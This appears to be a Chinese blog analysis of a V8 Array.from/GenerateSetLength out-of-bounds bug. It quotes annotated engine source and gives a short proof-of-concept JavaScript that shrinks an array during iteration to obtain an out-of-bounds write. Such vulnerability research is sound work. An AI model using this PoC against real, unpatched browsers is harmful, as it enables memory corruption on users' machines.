<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GenerateSetLength</span><span class="params">(TNode&lt;Context&gt; context, TNode&lt;Object&gt; <span class="built_in">array</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                         TNode&lt;Number&gt; length)</span> </span>&#123;</span><br><span class="line">    Label fast(this), runtime(this), done(this);</span><br><span class="line">    <span class="comment">// Only set the length in this stub if</span></span><br><span class="line">    <span class="comment">// 1) the array has fast elements,</span></span><br><span class="line">    <span class="comment">// 2) the length is writable,</span></span><br><span class="line">    <span class="comment">// 3) the new length is greater than or equal to the old length.</span></span><br><span class="line">    <span class="comment">// 1) Check that the array has fast elements.</span></span><br><span class="line">    <span class="comment">// TODO(delphick): Consider changing this since it does an an unnecessary</span></span><br><span class="line">    <span class="comment">// check for SMIs.</span></span><br><span class="line">    <span class="comment">// TODO(delphick): Also we could hoist this to after the array construction</span></span><br><span class="line">    <span class="comment">// and copy the args into array in the same way as the Array constructor.</span></span><br><span class="line">    BranchIfFastJSArray(<span class="built_in">array</span>, context, &amp;fast, &amp;runtime);</span><br><span class="line">    BIND(&amp;fast);</span><br><span class="line">    &#123;</span><br><span class="line">      TNode&lt;JSArray&gt; fast_array = CAST(<span class="built_in">array</span>);</span><br><span class="line">      TNode&lt;Smi&gt; length_smi = CAST(length);</span><br><span class="line">      TNode&lt;Smi&gt; old_length = LoadFastJSArrayLength(fast_array);</span><br><span class="line">      CSA_ASSERT(<span class="keyword">this</span>, TaggedIsPositiveSmi(old_length));</span><br><span class="line">      <span class="comment">// 2) Ensure that the length is writable.</span></span><br><span class="line">      <span class="comment">// TODO(delphick): This check may be redundant due to the</span></span><br><span class="line">      <span class="comment">// BranchIfFastJSArray above.</span></span><br><span class="line">      EnsureArrayLengthWritable(LoadMap(fast_array), &amp;runtime);</span><br><span class="line">      <span class="comment">// 3) If the created array already has a length greater than required,</span></span><br><span class="line">      <span class="comment">//    then use the runtime to set the property as that will insert holes</span></span><br><span class="line">      <span class="comment">//    into the excess elements and/or shrink the backing store.</span></span><br><span class="line">      GotoIf(SmiLessThan(length_smi, old_length), &amp;runtime);</span><br><span class="line">      StoreObjectFieldNoWriteBarrier(fast_array, JSArray::kLengthOffset,</span><br><span class="line">                                     length_smi);</span><br><span class="line">      Goto(&amp;done);</span><br><span class="line">    &#125;</span><br><span class="line">    BIND(&amp;runtime);</span><br><span class="line">    &#123;</span><br><span class="line">      CallRuntime(Runtime::kSetProperty, context, <span class="keyword">static_cast</span>&lt;Node*&gt;(<span class="built_in">array</span>),</span><br><span class="line">                  CodeStubAssembler::LengthStringConstant(), length,</span><br><span class="line">                  SmiConstant(LanguageMode::kStrict));</span><br><span class="line">      Goto(&amp;done);</span><br><span class="line">    &#125;</span><br><span class="line">    BIND(&amp;done);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>我們checkout到漏洞版本后分析一下漏洞函數，全局搜索之後發現在<code>ArrayFrom/ArrayOf</code>有这个builtin的调用，poc中用的是from，因此我们看下from的builtin代码.同时看下js里<code>Array.from()</code>函数的<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/from" target="_blank" rel="noopener">用法</a>。</p>
<p>Array.from()方法允许我们从<code>array-like objects</code>(有length属性以及可以用索引访问的elements)和<code>iterable objects</code>(比如Map和Set)中生成数组。</p>
<p>函数的参数为<code>(array-like,mapFn[optional],thisArg[optional])</code>，最常见的调用方式如下.第一种就是从字符串中split出数组，第二中定义了<code>mapFn</code>，我们可以将其应用在array的每个元素上，在这里就是让每个元素加倍。Array.from(obj, mapFn, thisArg)等价于Array.from(obj).map(mapFn, thisArg)。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Array</span>.from(<span class="string">'foo'</span>));</span><br><span class="line"><span class="comment">// expected output: Array ["f", "o", "o"]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Array</span>.from([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], x =&gt; x + x));</span><br><span class="line"><span class="comment">// expected output: Array [2, 4, 6]</span></span><br></pre></td></tr></table></figure>
<p>另一种from的对象为迭代对象,可以参考<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Iteration_protocols" target="_blank" rel="noopener">Iteration_protocols</a>和<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Iterators_and_Generators" target="_blank" rel="noopener">Iterators_and_Generators</a>，我们构造一个迭代对象时使用<code>[Symbol.iterator]</code>,比如下面的例子，我们定义range对象为迭代对象，编写自定义的迭代函数，value表示迭代器返回的值，done为true时表示迭代器迭代到了最后。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> range = &#123;</span><br><span class="line">  <span class="keyword">from</span>: <span class="number">1</span>,</span><br><span class="line">  to: <span class="number">5</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. call to for..of initially calls this</span></span><br><span class="line">range[<span class="built_in">Symbol</span>.iterator] = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...it returns the iterator object:</span></span><br><span class="line">  <span class="comment">// 2. Onward, for..of works only with this iterator, asking it for next values</span></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    current: <span class="keyword">this</span>.from,</span><br><span class="line">    last: <span class="keyword">this</span>.to,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. next() is called on each iteration by the for..of loop</span></span><br><span class="line">    next() &#123;</span><br><span class="line">      <span class="comment">// 4. it should return the value as an object &#123;done:.., value :...&#125;</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.current &lt;= <span class="keyword">this</span>.last) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123; <span class="attr">done</span>: <span class="literal">false</span>, <span class="attr">value</span>: <span class="keyword">this</span>.current++ &#125;;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123; <span class="attr">done</span>: <span class="literal">true</span> &#125;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// now it works!</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> num <span class="keyword">of</span> range) &#123;</span><br><span class="line">  alert(num); <span class="comment">// 1, then 2, 3, 4, 5</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>poc如下，感觉上是在iter返回前先调用<code>oobArray.length=0</code>，之后调用<code>GenerateSetLength</code>设置<code>oobArray</code>的<code>length属性=1024 * 1024 * 8</code>,此时可以访问的范围超过了原elements的范围，造成越界。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> oobArray = [];</span><br><span class="line"><span class="built_in">Array</span>.from.call(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> oobArray &#125;, &#123;[<span class="built_in">Symbol</span>.iterator] : <span class="function"><span class="params">_</span> =&gt;</span> (</span><br><span class="line">  &#123;</span><br><span class="line">    counter : <span class="number">0</span>,</span><br><span class="line">    max : <span class="number">1024</span> * <span class="number">1024</span> * <span class="number">8</span>,</span><br><span class="line">    next() &#123;</span><br><span class="line">      <span class="keyword">let</span> result = <span class="keyword">this</span>.counter++;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.counter == <span class="keyword">this</span>.max) &#123;</span><br><span class="line">        oobArray.length = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="attr">done</span>: <span class="literal">true</span>&#125;;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="attr">value</span>: result, <span class="attr">done</span>: <span class="literal">false</span>&#125;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">) &#125;);</span><br><span class="line">oobArray[oobArray.length - <span class="number">1</span>] = <span class="number">0x41414141</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ES #sec-array.from</span></span><br><span class="line">TF_BUILTIN(ArrayFrom, ArrayPopulatorAssembler) &#123;</span><br><span class="line">  TNode&lt;Context&gt; context = CAST(Parameter(BuiltinDescriptor::kContext));</span><br><span class="line">  TNode&lt;Int32T&gt; argc =</span><br><span class="line">      UncheckedCast&lt;Int32T&gt;(Parameter(BuiltinDescriptor::kArgumentsCount));</span><br><span class="line"></span><br><span class="line">  <span class="function">CodeStubArguments <span class="title">args</span><span class="params">(<span class="keyword">this</span>, ChangeInt32ToIntPtr(argc))</span></span>;</span><br><span class="line"></span><br><span class="line">  TNode&lt;Object&gt; map_function = args.GetOptionalArgumentValue(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If map_function is not undefined, then ensure it's callable else throw.</span></span><br><span class="line">  &#123;</span><br><span class="line">    Label no_error(this), error(this);</span><br><span class="line">    GotoIf(IsUndefined(map_function), &amp;no_error);</span><br><span class="line">    GotoIf(TaggedIsSmi(map_function), &amp;error);</span><br><span class="line">    Branch(IsCallable(map_function), &amp;no_error, &amp;error);</span><br><span class="line"></span><br><span class="line">    BIND(&amp;error);</span><br><span class="line">    ThrowTypeError(context, MessageTemplate::kCalledNonCallable, map_function);</span><br><span class="line"></span><br><span class="line">    BIND(&amp;no_error);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Label iterable(this), not_iterable(this), finished(this), if_exception(this);</span><br><span class="line"></span><br><span class="line">  TNode&lt;Object&gt; this_arg = args.GetOptionalArgumentValue(<span class="number">2</span>);</span><br><span class="line">  TNode&lt;Object&gt; items = args.GetOptionalArgumentValue(<span class="number">0</span>);</span><br><span class="line">  <span class="comment">// The spec doesn't require ToObject to be called directly on the iterable</span></span><br><span class="line">  <span class="comment">// branch, but it's part of GetMethod that is in the spec.</span></span><br><span class="line">  TNode&lt;JSReceiver&gt; array_like = ToObject(context, items);</span><br><span class="line"></span><br><span class="line">  TVARIABLE(Object, <span class="built_in">array</span>);</span><br><span class="line">  TVARIABLE(Number, length);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Determine whether items[Symbol.iterator] is defined:</span></span><br><span class="line">  <span class="function">IteratorBuiltinsAssembler <span class="title">iterator_assembler</span><span class="params">(state())</span></span>;</span><br><span class="line">  Node* iterator_method =</span><br><span class="line">      iterator_assembler.GetIteratorMethod(context, array_like);</span><br><span class="line">  Branch(IsNullOrUndefined(iterator_method), &amp;not_iterable, &amp;iterable);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//主要看这里对interable obj处理的部分</span></span><br><span class="line">  BIND(&amp;iterable);</span><br><span class="line">  &#123;</span><br><span class="line">    TVARIABLE(Number, index, SmiConstant(<span class="number">0</span>));</span><br><span class="line">    TVARIABLE(Object, var_exception);</span><br><span class="line">    Label loop(this, &amp;index), loop_done(this),</span><br><span class="line">        on_exception(<span class="keyword">this</span>, Label::kDeferred),</span><br><span class="line">        index_overflow(<span class="keyword">this</span>, Label::kDeferred);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check that the method is callable.</span></span><br><span class="line">    &#123;</span><br><span class="line">      Label get_method_not_callable(this, Label::kDeferred), next(this);</span><br><span class="line">      <span class="comment">//如果method是Smi(LSB=0，非指针)，跳到get_method_not_callable这个label</span></span><br><span class="line">      GotoIf(TaggedIsSmi(iterator_method), &amp;get_method_not_callable);</span><br><span class="line">      GotoIfNot(IsCallable(iterator_method), &amp;get_method_not_callable);</span><br><span class="line">      Goto(&amp;next);</span><br><span class="line"></span><br><span class="line">      BIND(&amp;get_method_not_callable);</span><br><span class="line">      ThrowTypeError(context, MessageTemplate::kCalledNonCallable,</span><br><span class="line">                     iterator_method);</span><br><span class="line"></span><br><span class="line">      BIND(&amp;next);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Construct the output array with empty length.</span></span><br><span class="line">    <span class="comment">//输出的array开始的length=0</span></span><br><span class="line">    <span class="built_in">array</span> = ConstructArrayLike(context, args.GetReceiver());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Actually get the iterator and throw if the iterator method does not yield</span></span><br><span class="line">    <span class="comment">// one.</span></span><br><span class="line">    IteratorRecord iterator_record =</span><br><span class="line">        iterator_assembler.GetIterator(context, items, iterator_method);</span><br><span class="line"></span><br><span class="line">    TNode&lt;Context&gt; native_context = LoadNativeContext(context);</span><br><span class="line">    TNode&lt;Object&gt; fast_iterator_result_map =</span><br><span class="line">        LoadContextElement(native_context, Context::ITERATOR_RESULT_MAP_INDEX);</span><br><span class="line"></span><br><span class="line">    Goto(&amp;loop);</span><br><span class="line"></span><br><span class="line">    BIND(&amp;loop);</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// Loop while iterator is not done.</span></span><br><span class="line">      TNode&lt;Object&gt; next = CAST(iterator_assembler.IteratorStep(</span><br><span class="line">          context, iterator_record, &amp;loop_done, fast_iterator_result_map));</span><br><span class="line">      TVARIABLE(Object, value,</span><br><span class="line">                CAST(iterator_assembler.IteratorValue(</span><br><span class="line">                    context, next, fast_iterator_result_map)));</span><br><span class="line"></span><br><span class="line">      <span class="comment">// If a map_function is supplied then call it (using this_arg as</span></span><br><span class="line">      <span class="comment">// receiver), on the value returned from the iterator. Exceptions are</span></span><br><span class="line">      <span class="comment">// caught so the iterator can be closed.</span></span><br><span class="line">      <span class="comment">// 可以看到map_function并不是在Iter赋值完后再遍历调用的，而是每得到一个Iter就对其应用一次</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="function">Label <span class="title">next</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line">        GotoIf(IsUndefined(map_function), &amp;next);</span><br><span class="line"></span><br><span class="line">        CSA_ASSERT(<span class="keyword">this</span>, IsCallable(map_function));</span><br><span class="line">        Node* v = CallJS(CodeFactory::Call(isolate()), context, map_function,</span><br><span class="line">                         this_arg, value.value(), index.value());</span><br><span class="line">        GotoIfException(v, &amp;on_exception, &amp;var_exception);</span><br><span class="line">        value = CAST(v);</span><br><span class="line">        Goto(&amp;next);</span><br><span class="line">        BIND(&amp;next);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Store the result in the output object (catching any exceptions so the</span></span><br><span class="line">      <span class="comment">// iterator can be closed).</span></span><br><span class="line">      <span class="comment">// 在这里调用Runtime的kCreateDataProperty为数组增加一个新的成员</span></span><br><span class="line">      Node* define_status =</span><br><span class="line">          CallRuntime(Runtime::kCreateDataProperty, context, <span class="built_in">array</span>.value(),</span><br><span class="line">                      index.value(), value.value());</span><br><span class="line">      GotoIfException(define_status, &amp;on_exception, &amp;var_exception);</span><br><span class="line"></span><br><span class="line">      index = NumberInc(index.value());</span><br><span class="line">      <span class="comment">//检查索引值不超过2^53</span></span><br><span class="line">      <span class="comment">// The spec requires that we throw an exception if index reaches 2^53-1,</span></span><br><span class="line">      <span class="comment">// but an empty loop would take &gt;100 days to do this many iterations. To</span></span><br><span class="line">      <span class="comment">// actually run for that long would require an iterator that never set</span></span><br><span class="line">      <span class="comment">// done to true and a target array which somehow never ran out of memory,</span></span><br><span class="line">      <span class="comment">// e.g. a proxy that discarded the values. Ignoring this case just means</span></span><br><span class="line">      <span class="comment">// we would repeatedly call CreateDataProperty with index = 2^53.</span></span><br><span class="line">      CSA_ASSERT_BRANCH(<span class="keyword">this</span>, [&amp;](Label* ok, Label* not_ok) &#123;</span><br><span class="line">        BranchIfNumberRelationalComparison(Operation::kLessThan, index.value(),</span><br><span class="line">                                           NumberConstant(kMaxSafeInteger), ok,</span><br><span class="line">                                           not_ok);</span><br><span class="line">      &#125;);</span><br><span class="line">      Goto(&amp;loop);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    BIND(&amp;loop_done);</span><br><span class="line">    &#123;</span><br><span class="line">      length = index;</span><br><span class="line">      Goto(&amp;finished);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    BIND(&amp;on_exception);</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// Close the iterator, rethrowing either the passed exception or</span></span><br><span class="line">      <span class="comment">// exceptions thrown during the close.</span></span><br><span class="line">      iterator_assembler.IteratorCloseOnException(context, iterator_record,</span><br><span class="line">                                                  &amp;var_exception);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Since there's no iterator, items cannot be a Fast JS Array.</span></span><br><span class="line">  BIND(&amp;not_iterable);</span><br><span class="line">  &#123;</span><br><span class="line">    CSA_ASSERT(<span class="keyword">this</span>, Word32BinaryNot(IsFastJSArray(array_like, context)));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Treat array_like as an array and try to get its length.</span></span><br><span class="line">    length = ToLength_Inline(</span><br><span class="line">        context, GetProperty(context, array_like, factory()-&gt;length_string()));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Construct an array using the receiver as constructor with the same length</span></span><br><span class="line">    <span class="comment">// as the input array.</span></span><br><span class="line">    <span class="built_in">array</span> = ConstructArrayLike(context, args.GetReceiver(), length.value());</span><br><span class="line"></span><br><span class="line">    TVARIABLE(Number, index, SmiConstant(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    GotoIf(SmiEqual(length.value(), SmiConstant(<span class="number">0</span>)), &amp;finished);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Loop from 0 to length-1.</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="function">Label <span class="title">loop</span><span class="params">(<span class="keyword">this</span>, &amp;index)</span></span>;</span><br><span class="line">      Goto(&amp;loop);</span><br><span class="line">      BIND(&amp;loop);</span><br><span class="line">      TVARIABLE(Object, value);</span><br><span class="line"></span><br><span class="line">      value = GetProperty(context, array_like, index.value());</span><br><span class="line"></span><br><span class="line">      <span class="comment">// If a map_function is supplied then call it (using this_arg as</span></span><br><span class="line">      <span class="comment">// receiver), on the value retrieved from the array.</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="function">Label <span class="title">next</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line">        GotoIf(IsUndefined(map_function), &amp;next);</span><br><span class="line"></span><br><span class="line">        CSA_ASSERT(<span class="keyword">this</span>, IsCallable(map_function));</span><br><span class="line">        value = CAST(CallJS(CodeFactory::Call(isolate()), context, map_function,</span><br><span class="line">                            this_arg, value.value(), index.value()));</span><br><span class="line">        Goto(&amp;next);</span><br><span class="line">        BIND(&amp;next);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Store the result in the output object.</span></span><br><span class="line">      CallRuntime(Runtime::kCreateDataProperty, context, <span class="built_in">array</span>.value(),</span><br><span class="line">                  index.value(), value.value());</span><br><span class="line">      index = NumberInc(index.value());</span><br><span class="line">      BranchIfNumberRelationalComparison(Operation::kLessThan, index.value(),</span><br><span class="line">                                         length.value(), &amp;loop, &amp;finished);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  BIND(&amp;finished);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Finally set the length on the output and return it.</span></span><br><span class="line">  <span class="comment">//调用漏洞函数，设置array的property中的length</span></span><br><span class="line">  GenerateSetLength(context, <span class="built_in">array</span>.value(), length.value());</span><br><span class="line">  args.PopAndReturn(<span class="built_in">array</span>.value());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然而进行到这里有个问题，上面代码中<code>Array.from</code>操作的<code>arr</code>对象是通过<code>array</code>设置的临时变量而后用<code>args.PopAndReturn(array.value())</code>返回的浅拷贝。正常我们是拿一个定义的obj_arr来进行<code>obj_arr.from</code>,不过其中的function返回了oob_arr。到这里俺翻了下姚老板的博客抄作业。学长之前也有这样的困惑，之后他看了es6的代码实现，我们可以在<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/call" target="_blank" rel="noopener">Function.prototype.call()</a>这里看到call method的用法，其第一个参数为this。体现到poc里就是我们的函数.通常我们可以使用prototype.call实现自己的构造函数，比如下面的代码，我们为Food和Toy赋予了新的属性。</p>
<p>继续看es6的代码,因为this是函数指针，因此最后会执行到<code>a = new c(len);</code>。当我们new后面跟function时，得到的是function的返回值，也就是oobArray。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Product</span>(<span class="params">name, price</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">  <span class="keyword">this</span>.price = price;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Food</span>(<span class="params">name, price</span>) </span>&#123;</span><br><span class="line">  Product.call(<span class="keyword">this</span>, name, price);</span><br><span class="line">  <span class="keyword">this</span>.category = <span class="string">'food'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Toy</span>(<span class="params">name, price</span>) </span>&#123;</span><br><span class="line">  Product.call(<span class="keyword">this</span>, name, price);</span><br><span class="line">  <span class="keyword">this</span>.category = <span class="string">'toy'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cheese = <span class="keyword">new</span> Food(<span class="string">'feta'</span>, <span class="number">5</span>);</span><br><span class="line"><span class="keyword">const</span> fun = <span class="keyword">new</span> Toy(<span class="string">'robot'</span>, <span class="number">40</span>);</span><br></pre></td></tr></table></figure>
